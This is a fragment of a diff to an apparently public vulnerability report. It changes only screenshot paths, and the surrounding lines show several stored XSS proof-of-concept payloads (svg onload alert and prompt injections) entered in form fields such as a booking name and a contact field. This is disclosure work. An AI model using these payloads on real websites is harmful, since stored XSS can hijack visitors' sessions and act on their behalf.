@@ -23,7 +23,7 @@ Movie Ticket booking'"><svg/onload=alert(/sxss/)><'"
 
 ```
 
-![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Vanguard/sxss1.png)
+![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Advanced-Real-Estate-Script/sxss1.png)
 
 ##### XSS2
 
@@ -39,7 +39,7 @@ Content-Disposition: form-data; name="contact"
 
 ```
 
-![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Vanguard/sxss2.png)
+![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Advanced-Real-Estate-Script/sxss2.png)
 
 ##### XSS3
 
@@ -56,7 +56,7 @@ sivakarthikeyan'"><svg/onload=prompt(/sxss3/)><'"
 
 ```
 
-![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Vanguard/sxss3.png)
+![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Advanced-Real-Estate-Script/sxss3.png)
 
 ##### XSS4
 
@@ -70,7 +70,7 @@ Tamizhan da Ennalum'"><svg/onload=alert(/sxss4/)><'"
 
 ```
 
-![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Vanguard/sxss4.png)
+![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Advanced-Real-Estate-Script/sxss4.png)
 
 
 ##### XSS5
@@ -89,7 +89,7 @@ fsdfd'"><svg/onload=prompt(/sxss6/)><'"
 
 ```
 
-![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Vanguard/sxss5.png)
+![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Advanced-Real-Estate-Script/sxss5.png)
 
 
 
@@ -108,7 +108,7 @@ News1'"><svg/onload=alert(/sxss7/)><'"
 
 ```
 
-![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Vanguard/sxss6.png)
+![image](https://raw.githubusercontent.com/d4wner/Vulnerabilities-Report/master/pic/Advanced-Real-Estate-Script/sxss6.png)
 
 
 #### CSRF:
